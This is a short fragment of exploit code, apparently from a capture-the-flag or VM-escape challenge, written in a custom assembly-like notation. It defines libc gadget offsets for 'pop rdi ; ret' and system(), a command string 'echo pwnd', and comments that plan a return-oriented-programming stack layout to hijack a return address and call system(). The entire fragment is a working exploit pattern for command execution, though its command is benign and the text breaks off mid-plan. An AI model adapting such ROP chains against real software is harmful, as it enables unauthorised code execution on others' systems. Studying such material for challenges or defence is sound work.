    .int 1 0x2a9b7 // : pop rdi ; ret
    .int 2 0x54790 // system()
    .string 127 "echo pwnd" // command
    
.code:
    // goal: stack should look something like this, but with libc offsets
    // 783: libc low + 0x0002a9b7 = ret, for stack alignment
    // 784: libc high
    // 785: libc low + 0x0002a9b7 = pop rdi ; ret
    // 786: libc high
    // 787: command low
    // 788: command high
    // 789: libc low + 0x00054790 = system()
    // 790: libc high

    // currently, we are at the high 32-bits of the return address
    // let a = <return address low>
    // let b = <return address high>
    // stack == [a b]

